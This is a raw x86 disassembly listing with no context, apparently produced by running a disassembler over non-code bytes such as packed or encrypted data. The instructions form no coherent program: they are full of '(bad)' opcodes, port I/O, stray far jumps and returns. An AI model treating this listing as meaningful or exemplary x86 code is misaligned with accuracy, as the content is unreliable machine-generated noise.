  41f15e:	in     al,0xc7
  41f160:	jno    0x41f15c
  41f162:	xchg   edi,eax
  41f163:	mov    eax,0x7a2af97b
  41f168:	mov    ebp,0x10916a88
  41f16d:	xchg   ecx,eax
  41f16e:	sub    esi,ebp
  41f170:	sahf   
  41f171:	xor    al,0x54
  41f173:	test   DWORD PTR [esi+eax*2-0x49a7cb41],ecx
  41f17a:	sub    esp,ecx
  41f17c:	push   ecx
  41f17d:	ror    BYTE PTR [esi+0x47771e47],1
  41f183:	sub    DWORD PTR [eax+edx*8],edi
  41f186:	addr16 mov ds:0x14fb,al
  41f18a:	data16 ins BYTE PTR es:[edi],dx
  41f18c:	pop    esp
  41f18d:	or     esp,DWORD PTR [ebx]
  41f18f:	dec    ecx
  41f190:	into   
  41f191:	jmp    0xc82b74f9
  41f196:	rcr    cl,0xdd
  41f199:	scas   eax,DWORD PTR es:[edi]
  41f19a:	jl     0x41f20d
  41f19c:	lods   eax,DWORD PTR ds:[esi]
  41f19d:	sub    al,ah
  41f19f:	dec    ebx
  41f1a0:	jno    0x41f128
  41f1a2:	iret   
  41f1a3:	cdq    
  41f1a4:	push   edx
  41f1a5:	xor    al,0xf5
  41f1a7:	jecxz  0x41f198
  41f1a9:	outs   dx,BYTE PTR ds:[esi]
  41f1aa:	and    eax,0xa4220ed0
  41f1af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f1b0:	push   ebx
  41f1b1:	loop   0x41f211
  41f1b3:	icebp  
  41f1b4:	popf   
  41f1b5:	pop    ds
  41f1b6:	and    eax,0x81b99b1a
  41f1bb:	inc    edx
  41f1bc:	xor    BYTE PTR [edx+0x62054ef7],bh
  41f1c2:	sbb    al,0xa1
  41f1c4:	mov    dl,0x6d
  41f1c6:	lea    edx,[ebx-0x4657281d]
  41f1cc:	xchg   edi,eax
  41f1cd:	sbb    DWORD PTR [ecx+0x1],esp
  41f1d0:	cmp    ah,BYTE PTR [edi-0x5767b991]
  41f1d6:	jns    0x41f23d
  41f1d8:	dec    esp
  41f1d9:	sar    DWORD PTR [esp+esi*4+0x322c4f1d],1
  41f1e0:	retf   
  41f1e1:	xchg   ebp,eax
  41f1e2:	in     al,dx
  41f1e3:	dec    edx
  41f1e4:	push   0xffffffda
  41f1e6:	xchg   ebx,eax
  41f1e7:	test   DWORD PTR [eax+0x16],esp
  41f1ea:	ds dec ecx
  41f1ec:	ret    0x4214
  41f1ef:	dec    edx
  41f1f0:	int    0x96
  41f1f2:	in     al,dx
  41f1f3:	stc    
  41f1f4:	fidiv  DWORD PTR [edi]
  41f1f6:	dec    eax
  41f1f7:	dec    edx
  41f1f8:	dec    edi
  41f1f9:	ss pop edi
  41f1fb:	push   ecx
  41f1fc:	and    al,0xfb
  41f1fe:	sbb    DWORD PTR [ebx],edx
  41f200:	and    BYTE PTR [edx+ebp*2],0x91
  41f204:	xchg   esi,eax
  41f205:	pop    edi
  41f206:	iret   
  41f207:	stos   BYTE PTR es:[edi],al
  41f208:	(bad)  
  41f209:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f20a:	jp     0x41f1c7
  41f20c:	fisub  DWORD PTR [ecx+0x2c]
  41f20f:	dec    edi
  41f210:	xor    dh,BYTE PTR [ebx-0x11eb5d70]
  41f216:	cmp    bl,BYTE PTR [eax-0x4d7202aa]
  41f21c:	push   ds
  41f21d:	cli    
  41f21e:	leave  
  41f21f:	cmp    edx,DWORD PTR [ebx+ebp*8]
  41f222:	xor    DWORD PTR [esi],edi
  41f224:	push   edi
  41f225:	xor    esp,DWORD PTR [eax+0x7f]
  41f228:	adc    ah,BYTE PTR [esi+0x26eddd1]
  41f22e:	mov    eax,ds:0xacd21fee
  41f233:	adc    edi,DWORD PTR [eax-0x7d]
  41f236:	arpl   WORD PTR [ebx+eiz*8-0x6b],sp
  41f23a:	scas   eax,DWORD PTR es:[edi]
  41f23b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f23c:	pop    eax
  41f23d:	inc    edi
  41f23e:	je     0x41f2a2
  41f240:	push   eax
  41f241:	ins    DWORD PTR es:[edi],dx
  41f242:	pop    edx
  41f243:	inc    esi
  41f244:	sbb    eax,0x422e6dea
  41f249:	mov    ah,0xb7
  41f24b:	cli    
  41f24c:	aaa    
  41f24d:	pop    ebp
  41f24e:	clc    
  41f24f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f250:	sbb    cl,BYTE PTR [esi-0x712e3a5d]
  41f256:	lahf   
  41f257:	sbb    esi,DWORD PTR [ebx+0x15bc2fbd]
  41f25d:	out    0x32,eax
  41f25f:	aas    
  41f260:	sub    BYTE PTR [ecx],ch
  41f262:	mov    ebp,0xdbaf3dfc
  41f267:	lods   eax,DWORD PTR ds:[esi]
  41f268:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f269:	sar    DWORD PTR [edi+0x64059caa],0x3f
  41f270:	inc    DWORD PTR [esi]
  41f272:	pop    ss
  41f273:	sahf   
  41f274:	jmp    0x41f1f9
  41f276:	pop    ds
  41f277:	adc    BYTE PTR [edx-0x36],bh
  41f27a:	out    0x3c,eax
  41f27c:	inc    ax
  41f27e:	cmc    
  41f27f:	lods   eax,DWORD PTR ds:[esi]
  41f280:	xchg   ebp,eax
  41f281:	arpl   dx,sp
  41f283:	addr16 retf 
  41f285:	scas   eax,DWORD PTR es:[edi]
  41f286:	xchg   ebx,eax
  41f287:	mov    ebx,0x825be9bf
  41f28c:	fld    st(4)
  41f28e:	mov    dl,0xee
  41f290:	outs   dx,DWORD PTR ds:[esi]
  41f291:	int3   
  41f292:	pop    ss
  41f293:	cmp    al,0x7e
  41f295:	xor    ch,BYTE PTR [eax]
  41f297:	into   
  41f298:	jnp    0x41f252
  41f29a:	stos   DWORD PTR es:[edi],eax
  41f29b:	cmp    eax,0x2ea758e8
  41f2a0:	fild   WORD PTR [ebp*4+0x1c33cf17]
  41f2a7:	xor    bh,BYTE PTR [edx-0x56]
  41f2aa:	retf   0x49a
  41f2ad:	jmp    0x41f2d0
  41f2af:	xor    ebx,edi
  41f2b1:	and    BYTE PTR [ecx-0x61],ah
  41f2b4:	cmc    
  41f2b5:	lods   al,BYTE PTR ds:[esi]
  41f2b6:	in     eax,0xe4
  41f2b8:	clc    
  41f2b9:	lods   al,BYTE PTR ds:[esi]
  41f2ba:	arpl   WORD PTR [edi-0x74],si
  41f2bd:	pop    ecx
  41f2be:	mov    edx,0x86d2d935
  41f2c3:	cmp    eax,0x349c6c9a
  41f2c8:	mov    ch,0x1a
  41f2ca:	dec    ecx
  41f2cb:	call   0x85ac1e15
  41f2d0:	ins    DWORD PTR es:[edi],dx
  41f2d1:	into   
  41f2d2:	push   cs
  41f2d3:	inc    edi
  41f2d4:	xchg   ecx,eax
  41f2d5:	cli    
  41f2d6:	mov    dl,0xf
  41f2d8:	pop    ebp
  41f2d9:	ja     0x41f333
  41f2db:	and    dl,BYTE PTR [esi-0xb8f35b8]
  41f2e1:	mov    ebp,DWORD PTR [eax]
  41f2e3:	data16 cmc 
  41f2e5:	sbb    ch,BYTE PTR fs:[edx-0x5cfa4d2]
  41f2ec:	adc    BYTE PTR [edx+0x613235d7],ah
  41f2f2:	or     BYTE PTR [edi-0x7b],ch
  41f2f5:	adc    DWORD PTR [ebp+0x6a],edi
  41f2f8:	xchg   edx,eax
  41f2f9:	rcr    BYTE PTR [ecx+0x34fe144],1
  41f2ff:	lods   al,BYTE PTR ds:[esi]
  41f300:	hlt    
  41f301:	cmp    ebx,DWORD PTR [eax+0x29e48940]
  41f307:	inc    eax
  41f308:	jb     0x41f334
  41f30a:	pop    ss
  41f30b:	int    0x1e
  41f30d:	rcl    BYTE PTR [ecx],cl
  41f30f:	mov    bh,0x5
  41f311:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f312:	push   ebp
  41f313:	mov    edi,ebx
  41f315:	(bad)  
  41f316:	adc    al,0xf0
  41f318:	mov    WORD PTR [edx-0x62],es
  41f31b:	inc    ebp
  41f31c:	test   BYTE PTR [esi-0x28658d19],0xae
  41f323:	jns    0x41f329
  41f325:	xor    bh,BYTE PTR [ecx+0x34]
  41f328:	and    ch,BYTE PTR [ecx-0x4353f7b9]
  41f32e:	fcmovne st,st(0)
  41f330:	pop    esp
  41f331:	sbb    bl,ah
  41f333:	fs pop ss
  41f335:	data16 stos BYTE PTR es:[edi],al
  41f337:	shl    DWORD PTR [edx+0x1b],cl
  41f33a:	mov    ds,ecx
  41f33c:	loop   0x41f3b8
  41f33e:	adc    cl,BYTE PTR [esi]
  41f340:	xchg   ebp,eax
  41f341:	sub    al,0xf
  41f343:	dec    ebx
  41f344:	pop    esp
  41f345:	pop    esi
  41f346:	enter  0x5cc1,0x8a
  41f34a:	xlat   BYTE PTR ds:[ebx]
  41f34b:	cmp    al,0x1b
  41f34d:	or     DWORD PTR ss:[eax-0x3d42e1e9],0xffc6d924
  41f358:	ins    DWORD PTR es:[edi],dx
  41f359:	pop    edx
  41f35a:	bound  ecx,QWORD PTR [esi+0x5e01d0cb]
  41f360:	sub    DWORD PTR [edi+ecx*8-0x2f],ecx
  41f364:	inc    esi
  41f365:	sbb    DWORD PTR [ebp+0x47],ebp
  41f368:	push   ds
  41f369:	cld    
  41f36a:	mov    DWORD PTR [edx],ecx
  41f36c:	ss int3 
  41f36e:	xchg   BYTE PTR [esi-0x36],ch
  41f371:	fadd   st,st(5)
  41f373:	loopne 0x41f35b
  41f375:	xor    DWORD PTR [eax],eax
  41f377:	mov    edi,0x2d8448f1
  41f37c:	das    
  41f37d:	push   ss
  41f37e:	jo     0x41f3f4
  41f380:	push   edx
  41f381:	inc    edx
  41f382:	push   esi
  41f383:	and    eax,0x3202e1
  41f388:	in     al,dx
  41f389:	jle    0x41f390
  41f38b:	enter  0x8f38,0xdd
  41f38f:	arpl   WORD PTR [ebp+0x1],bp
  41f392:	jnp    0x41f3fc
  41f394:	idiv   BYTE PTR [eax]
  41f396:	xlat   BYTE PTR ds:[ebx]
  41f397:	out    0xcb,eax
  41f399:	cmp    eax,0x33f0ea90
  41f39e:	inc    ecx
  41f39f:	mov    ch,0xdd
  41f3a1:	xchg   ecx,eax
  41f3a2:	imul   ecx,DWORD PTR [ebx-0x43],0x3ee75c0b
  41f3a9:	push   cs
  41f3aa:	push   esp
  41f3ab:	rcr    BYTE PTR [eax+0x58],1
  41f3ae:	or     al,dh
  41f3b0:	jge    0x41f3fd
  41f3b2:	and    edx,DWORD PTR [ebx]
  41f3b4:	adc    BYTE PTR [ebx-0x7],dh
  41f3b7:	mov    eax,0xcac0d4f8
  41f3bc:	xchg   edx,eax
  41f3bd:	jmp    0x3b70caed
  41f3c2:	xor    bl,BYTE PTR [ecx-0x4f]
  41f3c5:	sti    
  41f3c6:	leave  
  41f3c7:	in     eax,0x42
  41f3c9:	cs dec esi
  41f3cb:	xchg   ebp,eax
  41f3cc:	sbb    ecx,ebx
  41f3ce:	xor    BYTE PTR [edi+0x44],bl
  41f3d1:	dec    edi
  41f3d2:	mov    DWORD PTR [ebp-0x2e],esp
  41f3d5:	inc    ecx
  41f3d6:	jo     0x41f3f3
  41f3d8:	or     eax,0xe63a894c
  41f3dd:	ret    0x51ff
  41f3e0:	mov    edi,0x3cd6e95d
  41f3e5:	enter  0x104e,0x55
  41f3e9:	dec    edi
  41f3ea:	or     eax,0x7af7047c
  41f3ef:	test   DWORD PTR [ebx],edx
  41f3f1:	popf   
  41f3f2:	outs   dx,DWORD PTR ds:[esi]
  41f3f3:	jmp    0x3de8:0x9e020e54
  41f3fa:	in     eax,0x4d
  41f3fc:	iret   
  41f3fd:	dec    ecx
  41f3fe:	ret    
  41f3ff:	and    ecx,esi
  41f401:	sub    al,0x57
  41f403:	cli    
  41f404:	sbb    DWORD PTR [esi+esi*2],esi
  41f407:	cwde   
  41f408:	sbb    bh,BYTE PTR [eax-0x1e35df74]
  41f40e:	int    0x7d
  41f410:	(bad)  
  41f412:	(bad)  
  41f413:	hlt    
  41f414:	retf   
  41f415:	xchg   edx,eax
  41f416:	sub    al,0xda
  41f418:	jmp    0xcc04e730
  41f41d:	or     BYTE PTR [eax],cl
  41f41f:	daa    
  41f420:	xchg   ebx,eax
  41f421:	or     cl,al
  41f423:	test   eax,0x86d0527d
  41f428:	mov    ds:0xf0ec643b,eax
  41f42d:	mov    dh,0x31
  41f42f:	sbb    BYTE PTR [esp+ebx*4],dl
  41f432:	xor    BYTE PTR [edi-0x2686371d],cl
  41f438:	and    esp,ebp
  41f43a:	cmp    BYTE PTR [edi+ebx*2-0x52],dl
  41f43e:	mov    dh,0x2d
  41f440:	xor    BYTE PTR [ebp-0xf1f1e9f],dl
  41f446:	dec    ebp
  41f447:	daa    
  41f448:	lds    esp,FWORD PTR [edx]
  41f44a:	ret    
  41f44b:	lods   eax,DWORD PTR ds:[esi]
  41f44c:	in     al,0xe9
  41f44e:	punpcklwd mm5,mm2
  41f451:	pop    eax
  41f452:	mov    WORD PTR [ebp+0x30],gs
  41f455:	les    ecx,FWORD PTR [edi]
  41f457:	lods   eax,DWORD PTR ds:[esi]
  41f458:	jmp    0x41f41d
  41f45a:	sar    BYTE PTR cs:[edx-0x61],0x26
  41f45f:	push   edx
  41f460:	out    0x2,al
  41f462:	outs   dx,BYTE PTR ds:[esi]
  41f463:	stos   BYTE PTR es:[edi],al
  41f464:	bound  edi,QWORD PTR ds:0xba45b02c
  41f46a:	dec    edi
  41f46b:	inc    ebp
  41f46c:	pop    ecx
  41f46d:	scas   eax,DWORD PTR es:[edi]
  41f46e:	jmp    0xbded:0x5c9cef44
  41f475:	pop    esi
  41f476:	mov    esp,0x54b0427b
  41f47b:	xor    ah,BYTE PTR [edi+0x44]
  41f47e:	rol    dl,0x77
  41f481:	xchg   esp,eax
  41f482:	push   0x27e1c856
  41f487:	dec    ebp
  41f488:	lahf   
  41f489:	mov    BYTE PTR [esi],dl
  41f48b:	retf   0x469a
  41f48e:	dec    edi
  41f48f:	ret    0x3f20
  41f492:	scas   eax,DWORD PTR es:[edi]
  41f493:	inc    ebp
  41f494:	aam    0xc3
  41f496:	xchg   edx,eax
  41f497:	aam    0x68
  41f499:	fisubr WORD PTR [esp+esi*8]
  41f49c:	dec    eax
  41f49d:	iret   
  41f49e:	xchg   ebp,eax
  41f49f:	(bad)  
  41f4a0:	jg     0x41f4c0
  41f4a2:	jmp    0x41f459
  41f4a4:	xbegin 0x505e5e51
  41f4aa:	fild   DWORD PTR [eax-0x23]
  41f4ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f4ae:	outs   dx,BYTE PTR ds:[esi]
  41f4af:	pop    esp
  41f4b0:	xchg   edi,eax
  41f4b1:	fcom   QWORD PTR [ebp-0x406ec64a]
  41f4b7:	cmp    BYTE PTR [ebx+eiz*8],ch
  41f4ba:	pop    eax
  41f4bb:	bound  esi,QWORD PTR [edi+0x2e9c6f42]
  41f4c1:	out    dx,eax
  41f4c2:	int    0x35
  41f4c4:	cs inc esp
  41f4c6:	fst    QWORD PTR [ecx-0x27]
  41f4c9:	sub    DWORD PTR [edi+ecx*2+0x25b0a6f2],0x25
  41f4d1:	mov    dl,bh
  41f4d3:	psrad  mm5,QWORD PTR [edi+ebx*2]
  41f4d7:	cli    
  41f4d8:	loopne 0x41f48d
  41f4da:	pop    ss
  41f4db:	xchg   edi,eax
  41f4dc:	(bad)  
  41f4dd:	test   BYTE PTR [edi+0x55],0x3d
  41f4e1:	jecxz  0x41f538
  41f4e3:	push   0x5f
  41f4e5:	cdq    
  41f4e6:	adc    ah,al
  41f4e8:	sub    eax,0x5d3e5c63
  41f4ed:	sub    DWORD PTR [edi+0x5d36181d],ebp
  41f4f3:	add    BYTE PTR [ecx],bl
  41f4f5:	stc    
  41f4f6:	test   eax,0xf73126d3
  41f4fb:	mov    ecx,0x99a2a95a
  41f500:	jnp    0x41f55c
  41f502:	and    DWORD PTR [esi-0x71],edi
  41f505:	add    bl,BYTE PTR [edx+0x39]
  41f508:	cmp    DWORD PTR [edx-0x51432ec8],0xffffffc0
  41f50f:	and    eax,0xcd8e8f4d
  41f514:	sbb    DWORD PTR [ecx+0x3e],ebx
  41f517:	fidivr WORD PTR [edx+esi*2-0x77]
  41f51b:	mov    esi,0x75adabac
  41f520:	fs aam 0xe3
  41f523:	retf   
  41f524:	repnz repnz mov BYTE PTR [esi-0x76b6de5b],dh
  41f52c:	jge    0x41f4f2
  41f52e:	ds mov bl,0x6
  41f531:	pop    ss
  41f532:	pop    DWORD PTR [esi+0x74]
  41f535:	dec    ebp
  41f536:	ret    
  41f537:	test   al,0x9d
  41f539:	push   edx
  41f53a:	and    BYTE PTR [ebx-0x18],ah
  41f53d:	cmp    cl,BYTE PTR [edi]
  41f53f:	push   cs
  41f540:	jmp    0x6ddf:0xd2d3e5f
  41f547:	sahf   
  41f548:	sub    eax,0xae640b74
  41f54d:	pop    ds
  41f54e:	(bad)  
  41f54f:	iret   
  41f550:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f551:	repz mov ecx,0x2dde27eb
  41f557:	adc    ecx,esi
  41f559:	les    eax,FWORD PTR [ecx]
  41f55b:	adc    eax,0x1f9c2b29
  41f560:	mov    edx,0x8b335730
  41f565:	loop   0x41f5d7
  41f567:	(bad)  
  41f568:	mov    bh,0xf6
  41f56a:	push   ebp
  41f56b:	jo     0x41f5de
  41f56d:	(bad)  
  41f56e:	call   0xa3a0fb84
  41f573:	ret    
  41f574:	cs mov edx,0x80b490e2
  41f57a:	pushf  
  41f57b:	pop    edx
  41f57c:	aad    0x52
  41f57e:	pop    esi
  41f57f:	icebp  
  41f580:	mov    WORD PTR [ebp-0x41],ss
  41f583:	add    edi,DWORD PTR [edi-0x30]
  41f586:	push   0xfffffff8
  41f588:	pop    es
  41f589:	in     eax,0xef
  41f58b:	fcom   QWORD PTR [ebx-0x23de09c1]
  41f591:	xchg   BYTE PTR [eax+ecx*4],cl
  41f594:	aad    0xd6
  41f596:	push   esp
  41f597:	mov    bh,0xfb
  41f599:	repnz mov dh,0x4c
  41f59c:	mov    ds:0x3963c782,eax
  41f5a1:	jg     0x41f561
  41f5a3:	call   0x68e9ebee
  41f5a8:	ret    
  41f5a9:	push   ebp
  41f5aa:	jbe    0x41f5eb
  41f5ac:	mov    bh,0xa0
  41f5ae:	rcr    esi,cl
  41f5b0:	cli    
  41f5b1:	mov    ebp,0xd9dd3195
  41f5b6:	bound  ebx,QWORD PTR [ebx+0x16]
  41f5b9:	imul   ebx,esi,0xffffffc8
  41f5bc:	rcl    DWORD PTR [ebx],cl
  41f5be:	mov    ebp,0x1abdd002
  41f5c3:	inc    edi
  41f5c4:	jns    0x41f55c
  41f5c6:	imul   esi,ebx,0x79
  41f5c9:	jp     0x41f5b5
  41f5cb:	inc    ebp
  41f5cd:	mov    ds:0x2ea1522a,al
  41f5d2:	xor    al,0x88
  41f5d4:	sar    eax,0xae
  41f5d7:	dec    eax
  41f5d8:	ja     0x41f64b
  41f5da:	adc    ah,BYTE PTR [ebp-0x6f]
  41f5dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f5de:	inc    edx
  41f5df:	inc    edx
  41f5e0:	or     cl,dh
  41f5e2:	out    0x49,al
  41f5e4:	inc    ebx
  41f5e5:	pusha  
  41f5e6:	pop    esp
  41f5e7:	push   ebx
  41f5e8:	mov    ch,0xaf
  41f5ea:	cmp    DWORD PTR [esi-0x7b],esp
  41f5ed:	jmp    0xa2d15de9
  41f5f2:	call   FWORD PTR [edx+0x19866096]
  41f5f8:	lods   al,BYTE PTR ds:[esi]
  41f5f9:	add    ch,0x7d
  41f5fc:	cwde   
  41f5fd:	imul   edi,esi,0x66e0a0bb
  41f603:	ds ss mov bh,0x6c
  41f607:	out    dx,eax
  41f608:	mov    BYTE PTR [ebx],bl
  41f60a:	mov    ebp,0x6af79b48
  41f60f:	cwde   
  41f610:	xchg   edx,eax
  41f611:	jmp    0x41f655
  41f613:	mov    al,ds:0x8221ca98
  41f618:	lods   eax,DWORD PTR ds:[esi]
  41f619:	fisttp DWORD PTR [ebx-0x136d8ddd]
  41f61f:	or     al,0xfc
  41f621:	mov    cl,0x4c
  41f623:	and    bh,BYTE PTR ds:0xba051e85
  41f629:	in     al,0xae
  41f62b:	mov    al,ds:0x912130a2
  41f630:	mov    ah,0xed
  41f632:	icebp  
  41f633:	adc    al,0x8
  41f635:	mov    cl,0x33
  41f637:	mov    ds:0xa223bb54,al
  41f63c:	cwde   
  41f63d:	pop    edx
  41f63e:	and    dh,BYTE PTR [ebx-0x7]
  41f641:	and    eax,0xccf66dc8
  41f646:	pop    ebp
  41f647:	or     DWORD PTR [esi],0x85af906e
  41f64d:	dec    eax
  41f64e:	sub    edi,DWORD PTR [ebp-0x4b]
  41f651:	retf   
  41f652:	jbe    0x41f607
  41f654:	sub    dl,BYTE PTR [eax-0xf]
  41f657:	mov    eax,ds:0x5c4ecb3d
  41f65c:	lods   al,BYTE PTR ds:[esi]
  41f65d:	test   eax,0x48f5293b
  41f662:	adc    ebx,DWORD PTR [edx]
  41f664:	in     eax,0x93
  41f666:	xchg   BYTE PTR [ecx-0x41eff23c],ah
  41f66c:	cmp    al,BYTE PTR [esi+0x3d]
  41f66f:	ins    DWORD PTR es:[edi],dx
  41f670:	jmp    0xffbd:0x831af3f8
  41f677:	mov    bl,0x15
  41f679:	mov    al,BYTE PTR [edx+0x5eeeeb07]
  41f67f:	fsub   DWORD PTR ds:0xbb9a7e64
  41f685:	adc    BYTE PTR [ecx-0x1e152a5f],dl
  41f68b:	mov    esi,DWORD PTR [esi-0x37ceddee]
  41f691:	xor    ebx,ecx
  41f693:	pop    ss
  41f694:	bound  edi,QWORD PTR [edx+0x59]
  41f697:	fistp  QWORD PTR ds:0xfe94c815
  41f69d:	dec    ecx
  41f69e:	popa   
  41f69f:	push   ebx
  41f6a0:	xchg   DWORD PTR [edx+0x5b4f0759],esi
  41f6a6:	jp     0x41f672
  41f6a8:	push   eax
  41f6a9:	jmp    0x151a:0x3e030838
  41f6b0:	or     eax,0x65dbf21a
  41f6b5:	inc    edx
  41f6b6:	sbb    al,cl
  41f6b8:	mov    ebp,0xb9a15a7b
  41f6bd:	mov    bl,0x28
  41f6bf:	inc    ebx
  41f6c0:	jl     0x41f6f0
  41f6c2:	shl    DWORD PTR [ecx+0x6f],1
  41f6c5:	xchg   ebx,eax
  41f6c6:	dec    eax
  41f6c7:	retf   0x261b
  41f6ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f6cb:	loop   0x41f681
  41f6cd:	xor    eax,0xe5d36032
  41f6d2:	mov    esi,0x5752e90c
  41f6d7:	dec    edi
  41f6d8:	mov    eax,ds:0x13699839
  41f6dd:	dec    ecx
  41f6de:	mov    bh,0x76
  41f6e0:	call   0xb5c0efa2
  41f6e5:	dec    edi
  41f6e6:	nop
  41f6e7:	cmp    DWORD PTR [eax-0x1658bdc8],ebx
  41f6ed:	mov    ebx,0x7263ce26
  41f6f2:	sbb    eax,DWORD PTR ds:0x9fd9b4cb
  41f6f8:	fsub   st(1),st
  41f6fa:	enter  0xea91,0x35
  41f6fe:	outs   dx,BYTE PTR ds:[esi]
  41f6ff:	ret    
  41f700:	fisub  WORD PTR [edx-0x5e]
  41f703:	sub    bh,BYTE PTR [ebx+0x74]
  41f706:	add    ebx,DWORD PTR [eax-0x77]
  41f709:	jg     0x41f69f
  41f70b:	xor    edi,DWORD PTR [esi]
  41f70d:	or     bh,ch
  41f70f:	xor    eax,0xc1ec162
  41f714:	jb     0x41f777
  41f716:	mov    eax,0xcb09f072
  41f71b:	pop    esp
  41f71c:	xchg   ebx,eax
  41f71d:	dec    eax
  41f71e:	pop    esi
  41f71f:	icebp  
  41f720:	pushf  
  41f721:	xchg   ecx,eax
  41f722:	push   0x4092ffae
  41f727:	call   0x67060bb5
  41f72c:	outs   dx,BYTE PTR ds:[esi]
  41f72d:	sbb    al,0x2
  41f72f:	cld    
  41f730:	das    
  41f731:	xchg   ebp,eax
  41f732:	mov    edx,0xee58d4b2
  41f737:	xchg   edx,eax
  41f738:	aam    0xc8
  41f73a:	and    eax,0xd1de3ebf
  41f73f:	(bad)  
  41f740:	and    al,0x8e
  41f742:	push   ecx
  41f743:	inc    BYTE PTR [ebx+0x27ace43f]
  41f749:	inc    edi
  41f74a:	cli    
  41f74b:	and    ch,BYTE PTR [ebx-0x2d]
  41f74e:	jbe    0x41f76f
  41f750:	sbb    dh,BYTE PTR [edi-0x759348c4]
  41f756:	(bad)  
  41f757:	mov    esp,0xbb0cab85
  41f75c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f75d:	cdq    
  41f75e:	cli    
  41f75f:	stc    
  41f760:	xchg   ecx,eax
  41f761:	adc    DWORD PTR [esi],esp
  41f763:	mov    BYTE PTR [edx+ebx*1+0x291a308d],bh
  41f76a:	sti    
  41f76b:	stc    
  41f76c:	xchg   esp,eax
  41f76d:	sbb    BYTE PTR [eax+0x27],cl
  41f770:	pop    esi
  41f771:	jnp    0x41f79e
  41f773:	mov    al,ds:0xd0a40a21
  41f778:	cmp    DWORD PTR [ebx+0x368770dc],esi
  41f77e:	out    dx,eax
  41f77f:	xchg   esp,eax
  41f780:	shl    DWORD PTR [ebx+eax*4],cl
  41f783:	or     cl,BYTE PTR [ebp-0x6c9ffe24]
  41f789:	or     eax,0x6b66c13f
  41f78e:	add    dh,dh
  41f790:	not    DWORD PTR [ebx]
  41f792:	pop    edx
  41f793:	icebp  
  41f794:	adc    ah,ah
  41f796:	pushf  
  41f797:	xor    ecx,esp
  41f799:	shl    DWORD PTR [eax-0x444e8bd],cl
  41f79f:	test   eax,0x760fe2bb
  41f7a4:	pusha  
  41f7a5:	fcmovnu st,st(5)
  41f7a7:	rcl    BYTE PTR [ecx+0x49b547c2],0xa1
  41f7ae:	mov    WORD PTR [edx+0x7b],cs
  41f7b1:	call   0xf1d1e176
  41f7b6:	mov    edi,0x9b9b9c03
  41f7bb:	fimul  WORD PTR [esi-0x21]
  41f7be:	pop    ds
  41f7bf:	mov    al,0x26
  41f7c1:	xchg   BYTE PTR [esi],dh
  41f7c3:	hlt    
  41f7c4:	add    BYTE PTR [eax+0x29],bh
  41f7c7:	pop    ecx
  41f7c8:	iret   
  41f7c9:	aas    
  41f7ca:	mov    bh,0x89
  41f7cc:	arpl   WORD PTR [edi+0x3a990f5c],di
  41f7d2:	fincstp 
  41f7d5:	jae    0x41f79c
  41f7d7:	test   al,0x5e
  41f7d9:	xchg   esp,eax
  41f7da:	rol    DWORD PTR es:[ebx+0x70],0xe4
  41f7df:	out    0x5e,al
  41f7e1:	cmp    eax,0x94c96c52
  41f7e6:	shr    ebx,cl
  41f7e8:	retf   0x5f6b
  41f7eb:	mov    ecx,0x426a5960
  41f7f0:	ret    0x98f8
  41f7f3:	and    eax,0xc8df3f6d
  41f7f8:	int    0x3a
  41f7fa:	sub    esi,DWORD PTR [edx+0x3c]
  41f7fd:	mov    dl,0xd3
  41f7ff:	jecxz  0x41f80c
  41f801:	outs   dx,BYTE PTR ds:[esi]
  41f802:	cwde   
  41f803:	xor    eax,0x15595a1d
  41f808:	shr    BYTE PTR [edx],1
  41f80a:	adc    bl,ah
  41f80c:	cli    
  41f80d:	xor    DWORD PTR [esi+0x13],edx
  41f810:	in     eax,0x8a
  41f812:	int    0x2
  41f814:	lds    esp,FWORD PTR [eax+0x7b42e0b2]
  41f81a:	sbb    ebp,DWORD PTR [ebx]
  41f81c:	or     eax,0x7e
  41f81f:	dec    ebx
  41f820:	jmp    0x4a87:0x5a6cca50
  41f827:	pop    edi
  41f828:	iret   
  41f829:	int3   
  41f82a:	ficom  WORD PTR [esi]
  41f82c:	aad    0xc
  41f82e:	inc    edi
  41f82f:	aaa    
  41f830:	mov    ebp,0x707eda89
  41f835:	call   0xe871fc12
  41f83a:	test   BYTE PTR [edx-0x25],al
  41f83d:	xor    ebx,edx
  41f83f:	dec    edi
  41f840:	dec    edi
  41f841:	fld    QWORD PTR [ecx+0x24]
  41f844:	jecxz  0x41f878
  41f846:	push   eax
  41f847:	push   esi
  41f848:	retf   0x84d2
  41f84b:	dec    edx
  41f84c:	dec    edx
  41f84d:	ins    DWORD PTR es:[edi],dx
  41f84e:	mov    ch,0x1e
  41f850:	mov    dh,0x17
  41f852:	pop    ebx
  41f853:	int3   
  41f854:	or     ecx,DWORD PTR ss:[edx-0x4d681c3f]
  41f85b:	xor    dh,dl
  41f85d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f85e:	jnp    0x41f85d
  41f860:	test   DWORD PTR [edi+eiz*2],0x1cd1d3e5
  41f867:	in     eax,dx
  41f868:	shl    dh,cl
  41f86a:	xchg   ecx,eax
  41f86b:	adc    al,0xd4
  41f86d:	scas   eax,DWORD PTR es:[edi]
  41f86e:	xor    edx,DWORD PTR [ecx-0x7ae65625]
  41f874:	sti    
  41f875:	das    
  41f876:	adc    BYTE PTR [eax-0x2efa95d7],dl
  41f87c:	inc    ebp
  41f87d:	js     0x41f82f
  41f87f:	jmp    0x76b8:0xe2571311
  41f886:	lea    ecx,[edi]
  41f888:	mov    ch,0x67
  41f88a:	pop    ds
  41f88b:	xor    edi,DWORD PTR [edi+0x7cded3b1]
  41f891:	sub    eax,0xd6417f4e
  41f896:	ds div edi
  41f899:	push   ss
  41f89a:	jmp    0x2287:0x221c1427
  41f8a1:	out    dx,eax
  41f8a2:	arpl   WORD PTR [ecx-0x4a8d067],di
  41f8a8:	repnz push edx
  41f8aa:	iret   
  41f8ab:	jg     0x41f86a
  41f8ad:	add    ebx,DWORD PTR [esi+edx*1-0x68]
  41f8b1:	cmc    
